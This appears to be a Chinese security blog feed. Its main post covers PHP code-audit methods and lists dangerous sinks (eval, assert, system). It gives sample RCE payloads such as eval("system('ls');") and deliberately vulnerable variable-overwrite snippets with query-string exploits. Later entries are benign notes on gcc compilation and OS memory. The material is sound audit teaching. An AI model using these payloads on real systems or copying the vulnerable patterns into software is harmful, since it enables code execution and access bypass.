title="文件上传"></a>文件上传</h2><p>文件上传关注函数：</p><ul><li>move_uploaded_file</li></ul><h2 id="代码执行"><a href="#代码执行" class="headerlink" title="代码执行"></a>代码执行</h2><p>关注函数：</p><ul><li>eval</li><li>assert</li><li>call_user_func_array</li><li>preg_replace</li><li>call_user_func</li><li>动态函数 $a($b)</li></ul><h2 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h2><p>关注函数：</p><ul><li>system</li><li>exec</li><li>passthru</li><li>shell_exec</li><li>popen</li><li>proc_open</li><li>pcntl_exec</li></ul><p>防范方法：</p><p>用白名单对用户输入进行过滤</p><ul><li>使用自定义函数或函数库来替代外部命令的功能</li><li>使用 escapeshellarg()函数来处理命令参数</li><li>使用 safe_mode_exec_dir 指定可执行文件的路径</li></ul><h2 id="变量覆盖"><a href="#变量覆盖" class="headerlink" title="变量覆盖"></a>变量覆盖</h2><p>变量覆盖关注函数：</p><ul><li>extract</li><li>parse_str</li><li>import_request_variables</li></ul><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>PHP代码审计还有很多内容。这里就简单的写一下就是了</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;代码审计函数&quot;&gt;&lt;a href=&quot;#代码审计函数&quot; class=&quot;headerlink&quot; title=&quot;代码审计函数&quot;&gt;&lt;/a&gt;代码审计函数&lt;/h1&gt;&lt;h2 id=&quot;SQL注入&quot;&gt;&lt;a href=&quot;#SQL注入&quot; class=&quot;headerlink&quot; title=
      
    
    </summary>
    
    
      <category term="WEB安全" scheme="http://bai-ren-1.github.io/categories/WEB%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>代码审计思路</title>
    <link href="http://bai-ren-1.github.io/2019/12/27/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%80%9D%E8%B7%AF/"/>
    <id>http://bai-ren-1.github.io/2019/12/27/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%80%9D%E8%B7%AF/</id>
    <published>2019-12-27T14:57:56.000Z</published>
    <updated>2020-02-09T06:33:13.985Z</updated>
    
    <content type="html"><![CDATA[<h1 id="代码审计思路"><a href="#代码审计思路" class="headerlink" title="代码审计思路"></a>代码审计思路</h1><p>面试的时候问到了关于代码审计的思路，这里就简单总结一下。</p><p>常见的代码审计思路有以下四种：</p><ul><li>根据敏感关键字回溯参数传递过程；  （PS：即找敏感函数逆向回溯参数是否可控）</li><li>查找可控变量，正向追踪变量传递过程； （PS：即直接找可控参数正向追踪到漏洞处）</li><li>寻找敏感功能点，通读功能点代码；   （PS：即分业务功能去审计，重点关注易出现漏洞的功能如upload等）</li><li>直接通读全文代码。   （PS：直接怼项目所有文件，重点放在通防文件、配置文件、入口文件、通用函数文件等）</li></ul><h2 id="一、敏感函数回溯参数过程"><a href="#一、敏感函数回溯参数过程" class="headerlink" title="一、敏感函数回溯参数过程"></a>一、敏感函数回溯参数过程</h2><p>根据敏感函数来逆向追踪参数的传递过程，是目前使用的最多的一种方式，因为大多数漏洞是由于函数的使用不当造成的。另外非函数使用不当的漏洞，如SQL注入，等以后学习再详细介绍。这种方式的优缺点如下：</p><ul><li>优点：只需搜索相应敏感关键字，即可快速挖掘想要的漏洞，可定向挖掘，高效、高质量；</li><li>缺点：由于没有通读代码，对程序整体架构了解不够深入，在挖掘漏洞时定位利用会花点时间，另外对逻辑漏洞挖掘覆盖不到。</li></ul><h2 id="二、通读全文代码"><a href="#二、通读全文代码" class="headerlink" title="二、通读全文代码"></a>二、通读全文代码</h2><p>通读全文代码也有一定的技巧，否则很难读懂Web程序的，也很难理解代码的业务逻辑。首先我们要看程序的大体结构，如主目录有哪些文件，模块目录有哪些文件，插件目录有哪些文件，另外还要注意文件的大小，创建时间，就可以大概知道这个程序实现了那些功能，核心文件有哪些。</p><p>在看目录结构的时候，特别注意以下几个文件：</p><ul><li><strong>函数集文件</strong><br>函数集文件通常命名中包含<strong>functions或者common等关键字</strong>，这些文件里面是一些公共的函数，提供给其他文件统一调用，所以大多数文件都会在文件头部包含到其他文件。寻找这些文件的一个技巧就是打开index.php或者一些功能性文件。</li><li><strong>配置文件</strong><br>配置文件通常命名中包含config关键字，配置文件包括Web程序运行必须的<strong>功能性配置选项以及数据库等配置信息</strong>。从这个文件可以了解程序的小部分功能，另外看这个文件的时候注意观察配置文件中参数是用单引号还是双引号，如果是双引号，则很可能会存在代码执行漏洞。</li><li><strong>安全过滤文件</strong><br>安全过滤文件对我们做代码审计至关重要，通常命名中有<strong>filter、safe、check</strong>等关键字，这类文件主要是对参数进行过滤，比较常见的是针对SQL注入和XSS过滤，还有文件路径、执行的系统命令的参数。</li><li><strong>index文件</strong><br>index是一个程序的<strong>入口文件</strong>，所以我们只要读一遍index文件就可以大致了解整个程序的架构、运行的流程、包含到的文件。</li></ul><h2 id="三、根据功能点定向审计"><a href="#三、根据功能点定向审计" class="headerlink" title="三、根据功能点定向审计"></a>三、根据功能点定向审计</h2><p>根据经验我们简单介绍几个功能点会出现的漏洞：</p><ul><li><strong>文件上传功能</strong><br>这里说的文件上传在很多功能点都会出现，比如像<strong>文章编辑、资料编辑、头像上传、附件上传</strong>，这个功能最常见的漏洞就是任意文件上传了，后端程序没有严格地限制上传的格式，导致可以上传或者存在绕过的情况，而除了文件上传功能外，还经常发生SQL注入漏洞。</li></ul><ul><li><strong>文件管理功能</strong><br>在文件管理功能中，如果程序将文件名或者文件路径直接在参数中传递，则很有可能会存在任意文件的操作漏洞，比如任意文件读取等，利用的方法是在路径中使用../或者..\跳转目录。<br>除了任意文件操作漏洞外，还可能会存在XSS漏洞，程序会在页面中输出文件名，而通常会疏忽对文件名进行过滤，导致可以在数据库中存入带有尖括号等特殊符号的文件名，最后在页面显示的时候就会被执行。</li></ul><ul><li><strong>登录认证功能</strong><br>登录认证功能不是指一个过程，而是整个操作过程中的认证，目前的认证方式大多是基于Cookie和Session，不少程序会把当前登陆的用户账号等认证信息放到Cookie中，或许是加密方式。进行操作的时候直接从Cookie中读取当前用户信息，这里就存在一个算法可信的问题，如果这段Cookie信息没有加salt一类的东西，就可以导致任意用户登录漏洞，只要知道用户的不扥信息，即可生成认证令牌，甚至有的程序会直接把用户名放到Cookie中，操作的时候直接读取这个用户名的数据，这也是常说的越权漏洞。</li></ul><ul><li><strong>找回密码功能</strong><br>找回密码虽然看起来不像任意文件上传这种可以危害到服务器安全的漏洞，但是如果可以重置管理员的密码，也是可以间接控制业务权限甚至拿到服务权限的。找回密码功能的漏洞有很多利用场景，最常见的是验证码爆破。目前特别是APP应用，请求后端验证码的时候大多是4位，并且没有限制验证码的错误次数和有效时间，于是就出现了爆破的漏洞。</li></ul><p>下面再总结一下容易出现RCE的几个敏感点：</p><h2 id="四、PHP容易导致RCE的敏感函数"><a href="#四、PHP容易导致RCE的敏感函数" class="headerlink" title="四、PHP容易导致RCE的敏感函数"></a>四、PHP容易导致RCE的敏感函数</h2><p><strong>PHP代码执行函数</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">eval</span>()</span><br><span class="line">assert()</span><br><span class="line">preg_replace()</span><br><span class="line">call_user_func()</span><br><span class="line">call_user_func_array()</span><br><span class="line">array_map()</span><br><span class="line">create_function()</span><br></pre></td></tr></table></figure><p>这些函数会将参数当做php代码或者php函数和参数进行执行,下面进行具体的利用解释：</p><ol><li><p><strong>eval (PHP 4, PHP 5, PHP 7)</strong> </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">eval</span> (string $code):mixed</span><br></pre></td></tr></table></figure><blockquote><p>作用：将参数字符串 $code 作为PHP代码执行</p></blockquote></li></ol><ol start="2"><li><p><strong>assert (PHP 4, PHP 5, PHP 7)</strong> </p><ul><li>PHP 5</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">assert ( mixed $assertion [, string $description ] ) : bool</span><br></pre></td></tr></table></figure><ul><li>PHP 7</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">assert ( mixed $assertion [, Throwable $exception ] ) : bool</span><br></pre></td></tr></table></figure><blockquote><p>作用：判断一个断言是否为FALSE。当传入的参数assertion是字符串时，它将会被assert()当做php代码执行。</p></blockquote></li></ol><ol start="3"><li><p><strong>preg_replace(PHP 4, PHP 5, PHP 7)</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mixed preg_replace ( mixed pattern, mixed replacement, mixed subject [, int limit])</span><br></pre></td></tr></table></figure><blockquote><p>作用： <strong>/e 修正符</strong>使 preg_replace() 将 replacement 参数当作 PHP 代码</p><p>PS： PHP 7.0.0 起，会产生 E_WARNING错误，同时 “\e” 也无法起效</p></blockquote></li></ol><ol start="4"><li><p><strong>call_user_func(PHP 4, PHP 5, PHP 7)</strong>   </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">call_user_func ( callable $callback [, mixed $parameter [, mixed $... ]] ) : mixed</span><br></pre></td></tr></table></figure><blockquote><p>作用： 第一个参数callback是被调用的<strong>回调函数</strong>，其余参数是回调函数的参数</p></blockquote></li></ol><ol start="5"><li><p><strong>call_user_func_array (PHP 4 &gt;= 4.0.4, PHP 5, PHP 7)</strong> </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">call_user_func_array ( callable $callback , <span class="keyword">array</span> $param_arr ) : mixed</span><br></pre></td></tr></table></figure><blockquote><p>作用：把第一个参数作为回调函数（callback）调用，把参数数组作（param_arr）为回调函数的的参数传入；</p></blockquote></li></ol><ol start="6"><li><p><strong>array_map (PHP 4 &gt;= 4.0.6, PHP 5, PHP 7)</strong> </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">array_map ( callable $callback , <span class="keyword">array</span> $array1 [, <span class="keyword">array</span> $... ] ) : <span class="keyword">array</span></span><br></pre></td></tr></table></figure><blockquote><p> 作用：即将用户自定义函数作用到数组中的每个值上，并返回用户自定义函数作用后的带有新值的数组。 </p></blockquote><blockquote><p>PS：回调函数接受的参数数目应该和传递给 array_map() 函数的数组数目一致</p></blockquote></li></ol><ol start="7"><li><p><strong>create_function (PHP 4 &gt;= 4.0.1, PHP 5, PHP 7)</strong> </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">create_function ( string $args , string $code ) : string</span><br></pre></td></tr></table></figure><blockquote><p>作用： 从传递的参数创建一个匿名函数，并返回一个唯一的名称</p><p>PS：该函数是会在内部执行eval，所以安全性和eval一致</p></blockquote></li></ol><p>常见的利用payload如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">eval</span>(<span class="string">"system('ls');"</span>);</span><br><span class="line"></span><br><span class="line">assert(<span class="string">'phpinfo()'</span>);</span><br><span class="line"></span><br><span class="line">preg_replace(<span class="string">"/&lt;php&gt;(.*?)&lt;\/php&gt;/e"</span>, <span class="string">'\1'</span>, <span class="string">"&lt;php&gt;phpinfo()&lt;/php&gt;"</span>);</span><br><span class="line"></span><br><span class="line">call_user_func(<span class="string">'assert'</span>,<span class="string">'phpinfo()'</span>);</span><br><span class="line"></span><br><span class="line">call_user_func_array(<span class="string">'assert'</span>,<span class="keyword">array</span>(<span class="string">'phpinfo()'</span>));</span><br><span class="line"></span><br><span class="line">array_map(<span class="string">'assert'</span>,<span class="keyword">array</span>(<span class="string">'phpinfo()'</span>));</span><br><span class="line"></span><br><span class="line">create_function(<span class="string">'$a'</span>, <span class="string">'assert($a);'</span>));</span><br></pre></td></tr></table></figure><h2 id="五、PHP中变量覆盖"><a href="#五、PHP中变量覆盖" class="headerlink" title="五、PHP中变量覆盖"></a>五、PHP中变量覆盖</h2><p><strong>1、全局变量覆盖</strong></p><p>当<strong>register_global=ON</strong>时，变量来源可能是各个不同的地方，比如页面的表单，Cookie等都可以,那么就可能产生变量覆盖：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Register_globals: "</span>.(int)ini_get(<span class="string">"register_globals"</span>).<span class="string">"&lt;br/&gt;"</span>;   </span><br><span class="line"><span class="keyword">if</span> ($shabi)&#123;  </span><br><span class="line">   <span class="keyword">echo</span> <span class="string">"you are not shabi!"</span>;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>我们直接提交 shabi 参数即可覆盖到原有的变量$shabi /test.php?shabi=1</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">you are not shabi!</span><br></pre></td></tr></table></figure><p><strong>2、$$导致的变量覆盖问题</strong> </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">foreach</span> (<span class="keyword">array</span>(<span class="string">'_COOKIE'</span>,<span class="string">'_POST'</span>,<span class="string">'_GET'</span>) <span class="keyword">as</span> $_request)  </span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">foreach</span> ($$_request <span class="keyword">as</span> $_key=&gt;$_value)  </span><br><span class="line">    &#123;</span><br><span class="line">        $$_key=  $_value;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$id = <span class="keyword">isset</span>($id) ? $id : <span class="number">2</span>;</span><br><span class="line"><span class="keyword">if</span>($id == <span class="number">1</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"flag&#123;xxxxxxxxxx&#125;"</span>;</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> $id;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>上面是一个简单的例子，我们直接提交 id 参数，就能覆盖到原变量 $id。原因在于循环中在遍历到id参数时，会因为$$产生赋值操作：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$id = <span class="number">1</span></span><br></pre></td></tr></table></figure><p>这样就导致了变量的覆盖</p><p><strong>3、extract()变量覆盖</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">extract ( <span class="keyword">array</span> &amp;$array [, int $flags = EXTR_OVERWRITE [, string $prefix = <span class="keyword">NULL</span> ]] ) : int</span><br></pre></td></tr></table></figure><blockquote><p>作用：从数组中将变量导入到当前的符号表</p></blockquote><p>在调用extract()时使用在flag选项使用EXTR_SKIP保证已有变量不会被覆盖 ，flag字段的可用选项：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">EXTR_OVERWRITE如果有冲突，覆盖已有的变量。</span><br><span class="line">EXTR_SKIP如果有冲突，不覆盖已有的变量。</span><br><span class="line">EXTR_PREFIX_SAME如果有冲突，在变量名前加上前缀 prefix。EXTR_PREFIX_ALL给所有变量名加上前缀 prefix。</span><br><span class="line">EXTR_PREFIX_INVALID仅在非法／数字的变量名前加上前缀 prefix。EXTR_IF_EXISTS仅在当前符号表中已有同名变量时，覆盖它们的值。其它的都不处理。</span><br></pre></td></tr></table></figure><p><strong>4、parse_str()变量覆盖</strong> </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">parse_str ( string $encoded_string [, <span class="keyword">array</span> &amp;$result ] ) : void</span><br></pre></td></tr></table></figure><blockquote><p>作用： 如果 encoded_string 是 URL 传递入的查询字符串（query string），则将它解析为变量并设置到当前作用域（如果提供了 result 则会设置到该数组里 ） </p></blockquote><blockquote><p>PS： 不赞同没有 result参数的情况下使用此函数，并且在 PHP 7.2 中将<em>废弃</em>不设置参数的行为。 </p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$var=<span class="string">'shabi'</span>;  </span><br><span class="line">parse_str($_SERVER[<span class="string">'QUERY_STRING'</span>]);  </span><br><span class="line"><span class="keyword">print</span> $var;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>上面的代码很简单，就是定义一个 $var 变量，然后用parse_str来近些URL查询字符串，那我就可以通过查询 var 参数来覆盖到原来的 $var 变量，payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">test.php?<span class="keyword">var</span> = congming</span><br></pre></td></tr></table></figure><p><strong>5、import_request_variables变量覆盖</strong> </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(PHP <span class="number">4</span> &gt;= <span class="number">4.1</span><span class="number">.0</span>, PHP <span class="number">5</span> &lt; <span class="number">5.4</span><span class="number">.0</span>)  </span><br><span class="line">import_request_variables ( string $types [, string $prefix ] ) : bool</span><br></pre></td></tr></table></figure><blockquote><p>作用：将 GET／POST／Cookie 变量导入到全局作用域中</p></blockquote><blockquote><p>PS：第一个参数 types 指定需要导入的变量。可以用字母‘G’、‘P’和‘C’分别表示 GET、POST 和 Cookie。</p><p>这些字母不区分大小写，所以你可以使用‘g’、‘p’和‘c’的任何组合。POST 包含了通过 POST 方法上传的文件信息。</p><p>注意这些字母的顺序，当使用“gp”时，POST 变量将使用相同的名字覆盖 GET 变量。</p><p>任何 GPC 以外的字母都将被忽略。</p></blockquote><blockquote><p>PPS：第二个参数 prefix 作为变量名的前缀，置于所有被导入到全局作用域的变量之前。若没有指定第二个参数很容易导致变量覆盖。</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">"flag.php"</span>;</span><br><span class="line">import_request_variables(<span class="string">"g"</span>);</span><br><span class="line"><span class="keyword">if</span>($radish==<span class="string">"radish"</span>)&#123;    </span><br><span class="line">    <span class="keyword">echo</span> $flag;</span><br><span class="line">&#125;</span><br><span class="line">show_source(<span class="keyword">__FIlE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>因为没有指定前缀，并且函数指定了可以通过GET方式进行全局导入，我们能轻易覆盖变量，提交payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">test.php?radish=radish</span><br></pre></td></tr></table></figure><h2 id="六、反序列化"><a href="#六、反序列化" class="headerlink" title="六、反序列化"></a>六、反序列化</h2><p><strong>1、基本概念：</strong></p><ul><li>序列化：把对象转换为字节序列的过程称为对象的序列化</li><li>反序列化：把字节序列恢复为对象的过程称为对象的反序列化</li></ul><p><strong>2、漏洞成因：</strong></p><p><strong>反序列化对象</strong>中存在<strong>魔术方法</strong>，而且魔术方法中的<strong>代码</strong>可以被控制，漏洞根据不同的代码可以导致各种攻击，如代码注入，sql注入，目录遍历等等 </p><p><strong>3、漏洞本质：</strong></p><p>unserialize函数的变量可控，php文件中存在可利用的类，类中有魔术方法 </p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>关于反序列化的内容已经补齐，在“PHP反序列化”一篇中；关于代码审计具体关注点和关注函数在“代码审计关注点”中</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;代码审计思路&quot;&gt;&lt;a href=&quot;#代码审计思路&quot; class=&quot;headerlink&quot; title=&quot;代码审计思路&quot;&gt;&lt;/a&gt;代码审计思路&lt;/h1&gt;&lt;p&gt;面试的时候问到了关于代码审计的思路，这里就简单总结一下。&lt;/p&gt;
&lt;p&gt;常见的代码审计思路有以下四种：&lt;/p
      
    
    </summary>
    
    
      <category term="WEB安全" scheme="http://bai-ren-1.github.io/categories/WEB%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>程序员的自我修养-DAY2</title>
    <link href="http://bai-ren-1.github.io/2019/12/21/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB-DAY2/"/>
    <id>http://bai-ren-1.github.io/2019/12/21/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB-DAY2/</id>
    <published>2019-12-21T07:57:52.000Z</published>
    <updated>2019-12-21T08:36:58.625Z</updated>
    
    <content type="html"><![CDATA[<h1 id="程序员的自我修养-Day2"><a href="#程序员的自我修养-Day2" class="headerlink" title="程序员的自我修养 Day2"></a>程序员的自我修养 Day2</h1><p>上一篇文章是对操作系统和计组的一些基本概念进行了复习，这一篇主要是用来学习编译和链接的过程。</p><h2 id="gcc-编译过程"><a href="#gcc-编译过程" class="headerlink" title="gcc 编译过程"></a>gcc 编译过程</h2><p>我们在Linux下，对一个简单的hello.c的C文件使用命令gcc就能对其进行编译：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc hello.c</span><br><span class="line">./a.out</span><br></pre></td></tr></table></figure><p>上面的命令就是用gcc编译生成a.out，然后执行了a.out。看似很简单一气呵成，但其实gcc的过程包括了4个步骤：</p><p><strong>预处理</strong>（Prepressing）-&gt; <strong>编译</strong>（Compilation）-&gt; <strong>汇编</strong>（Assembly）-&gt; <strong>链接</strong>（Linking）， 这个gcc编译过程入下图所示：</p><p><img src="/2019/12/21/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB-DAY2/gcc%E7%BC%96%E8%AF%91%E8%BF%87%E7%A8%8B.png" alt></p><p>我们下面分开讲解这四个步骤。</p><h3 id="预编译"><a href="#预编译" class="headerlink" title="预编译"></a>预编译</h3><p>预编译相当于使用了下面这个命令（-E 参数代表只进行预编译）：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -E hello.c -o hello.i （执行后输出hello.i文件）</span><br></pre></td></tr></table></figure><p>预编译过程是对源代码中#开始的预编译指令进行处理：</p><ul><li>删除所有的”#define”，展开所有的宏定义</li><li>处理所有的条件预编译指令，如”#if”、”#ifdef”、”#elif”、”#else”、”#endif”</li><li>处理”#include”预编译指令，将包含文件插入到该预编译指令的位置</li><li>删除注释 “//“、”/**/“</li><li>保留所有的#pragma编译器指令</li></ul><h3 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h3><p>编译相当于使用了下面这个命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -S hello.i -o hello.s  （执行后输出hello.s文件）</span><br></pre></td></tr></table></figure><p>对于C语言来说，执行预编译和编译的程序是cc1；对于C++来说，对应的程序叫做cc1plus；Objective-C则是cc1obj；Java则是jc1。所以<strong>gcc只是对这些后台程序的包装，它根据不同参数要求去调用不同的预编译编译程序cc1、汇编器as、链接器ld</strong>。</p><h3 id="汇编"><a href="#汇编" class="headerlink" title="汇编"></a>汇编</h3><p>汇编相当于使用了下面这个命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gcc -c hello.s -o hello.o  （执行后输出hello.s文件）</span><br><span class="line">或者直接调用汇编器</span><br><span class="line">as hello.s -o hello.o</span><br></pre></td></tr></table></figure><p>也可以直接一步到位，由C源码直接预编译、编译、汇编输出成<strong>目标文件</strong>（object file）：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -c hello.c -o hello.o</span><br></pre></td></tr></table></figure><h3 id="链接"><a href="#链接" class="headerlink" title="链接"></a>链接</h3><p>如果通过调用链接器ld来执行，命令如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ld -static crt1.o crti.o crtbeginT.o hello.o -start-group -lgcc -lgcc_eh -lc -end-group crtend.o crtn.o</span><br></pre></td></tr></table></figure><p>需要将上面这一大堆文件链接起来才可以得到最后的a.out可执行文件。这里的过程后面补上。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;程序员的自我修养-Day2&quot;&gt;&lt;a href=&quot;#程序员的自我修养-Day2&quot; class=&quot;headerlink&quot; title=&quot;程序员的自我修养 Day2&quot;&gt;&lt;/a&gt;程序员的自我修养 Day2&lt;/h1&gt;&lt;p&gt;上一篇文章是对操作系统和计组的一些基本概念进行了复习
      
    
    </summary>
    
    
      <category term="二进制安全" scheme="http://bai-ren-1.github.io/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>程序员的自我修养-DAY1</title>
    <link href="http://bai-ren-1.github.io/2019/12/20/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB-DAY1/"/>
    <id>http://bai-ren-1.github.io/2019/12/20/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB-DAY1/</id>
    <published>2019-12-20T15:34:12.000Z</published>
    <updated>2019-12-24T02:38:06.832Z</updated>
    
    <content type="html"><![CDATA[<h1 id="程序员的自我修养-Day1"><a href="#程序员的自我修养-Day1" class="headerlink" title="程序员的自我修养 Day1"></a>程序员的自我修养 Day1</h1><p>静下心来好好研究计算机底层的实现，为二进制安全的研究做好铺垫。</p><h2 id="计算机体系结构"><a href="#计算机体系结构" class="headerlink" title="计算机体系结构"></a>计算机体系结构</h2><p>计算机的结构是一种由上而下组成的层结构，通过中间件进行访问：</p><p><img src="/2019/12/20/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB-DAY1/%E8%AE%A1%E7%AE%97%E6%9C%BA%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84.png" alt></p><p>这其中每个层级之间的通信协议就称为 “<strong>接口</strong>“。下层是接口的提供者，上层是接口的使用者。每个中间层都是对它下层的包装和拓展。</p><p>从上图我们可以看出：</p><ul><li>应用程序和开发工具通过<strong>操作系统API</strong>（API：Application Programming Interface 应用程序编程接口）和运行库（不同的运行库提供不同的API，例如Linux下的Glibc提供POSIX的API等）进行交互；</li><li>运行库使用的是操作系统提供的<strong>系统调用接口</strong>（System Call Interface），在现实中常通过软件中断的方式提供（Linux系统用0x80号中断作为系统调用接口，而Window中通过0x2E号中断作为系统调用接口）；</li><li>操作系统内核层对于硬件接口来说是使用者，而硬件接口定义决定了操作系统内核。硬件和操作系统内核之间的接口常称为”<strong>硬件规格</strong>“（Hardware Specification）；</li></ul><p>这样我们就大致的了解了计算机不同层次之间的组织关系和联系方式。</p><h2 id="给进程分配内存"><a href="#给进程分配内存" class="headerlink" title="给进程分配内存"></a>给进程分配内存</h2><p>简单的直接分配地址策略会导致下面几个问题：（具体例子可以直接看书）</p><ul><li><p><strong>地址空间不隔离</strong>：因为所有程序都放在同一片内存空间中没有隔离，恶意程序或者BUG程序可能会很轻易地改写到其他程序的数据（Overflow的意思）</p></li><li><p><strong>内存使用效率低</strong>：因为地址空间连续，当前换出的程序的空间可能不够等待运行的程序的装入，造成空间的浪费。另一方面，程序运行中频繁的换入换出也会使得效率极低·</p></li><li><p><strong>程序运行的地址不确定</strong>：因为每次程序需要装入时，我们需要从内存中分配一段足够的空闲空间给它，而这个空闲空间的地址是不确定的。这就涉及到了重定位问题。</p></li></ul><p>既然直接分配内存明显是不行的，我们就可以引入一个中间件 